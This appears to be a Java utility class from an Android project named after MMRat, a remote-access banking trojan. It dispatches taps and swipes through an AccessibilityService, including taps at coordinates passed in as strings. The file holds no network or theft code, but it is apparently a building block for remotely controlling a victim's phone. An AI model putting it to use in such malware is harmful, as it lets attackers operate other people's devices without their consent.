package com.example.mmrat_wannabe;

import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.accessibilityservice.AccessibilityService;

public class GestureUtils {

    private static final int DEFAULT_CLICK_X = 500;
    private static final int DEFAULT_CLICK_Y = 1000;
    private static final int DEFAULT_SWIPE_START_X = 500;
    private static final int DEFAULT_SWIPE_START_Y_UP = 1500;
    private static final int DEFAULT_SWIPE_END_Y_UP = 500;
    private static final int DEFAULT_SWIPE_START_Y_DOWN = 500;
    private static final int DEFAULT_SWIPE_END_Y_DOWN = 1500;
    private static final int DEFAULT_SWIPE_START_X_LEFT = 1000;
    private static final int DEFAULT_SWIPE_END_X_LEFT = 100;
    private static final int DEFAULT_SWIPE_START_X_RIGHT = 100;
    private static final int DEFAULT_SWIPE_END_X_RIGHT = 1000;

    private static final int DEFAULT_GESTURE_DURATION = 500;


    public static void doubleClick(AccessibilityService service) {
        click(service);
        click(service);
    }

    public static void click(AccessibilityService service) {
        performClick(service, DEFAULT_CLICK_X, DEFAULT_CLICK_Y);
    }

    public static void swipeUp(AccessibilityService service) {
        performSwipe(service, DEFAULT_SWIPE_START_X, DEFAULT_SWIPE_START_Y_UP, DEFAULT_SWIPE_START_X, DEFAULT_SWIPE_END_Y_UP);
    }

    public static void swipeDown(AccessibilityService service) {
        performSwipe(service, DEFAULT_SWIPE_START_X, DEFAULT_SWIPE_START_Y_DOWN, DEFAULT_SWIPE_START_X, DEFAULT_SWIPE_END_Y_DOWN);
    }

    public static void swipeLeft(AccessibilityService service) {
        performSwipe(service, DEFAULT_SWIPE_START_X_LEFT, DEFAULT_CLICK_Y, DEFAULT_SWIPE_END_X_LEFT, DEFAULT_CLICK_Y);
    }

    public static void swipeRight(AccessibilityService service) {
        performSwipe(service, DEFAULT_SWIPE_START_X_RIGHT, DEFAULT_CLICK_Y, DEFAULT_SWIPE_END_X_RIGHT, DEFAULT_CLICK_Y);
    }

    public static void click(AccessibilityService service, String x, String y) {
        int clickX = Integer.parseInt(x);
        int clickY = Integer.parseInt(y);
        performClick(service, clickX, clickY);
    }

    private static void performClick(AccessibilityService service, int x, int y) {
        Path clickPath = new Path();
        clickPath.moveTo(x, y);

        GestureDescription.Builder clickBuilder = new GestureDescription.Builder();
        clickBuilder.addStroke(new GestureDescription.StrokeDescription(clickPath, 0, 1));

        service.dispatchGesture(clickBuilder.build(), null, null);
    }

    private static void performSwipe(AccessibilityService service, int startX, int startY, int endX, int endY) {
        Path path = new Path();
        path.moveTo(startX, startY);
        path.lineTo(endX, endY);

        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, DEFAULT_GESTURE_DURATION));

        service.dispatchGesture(builder.build(), null, null);
    }
}
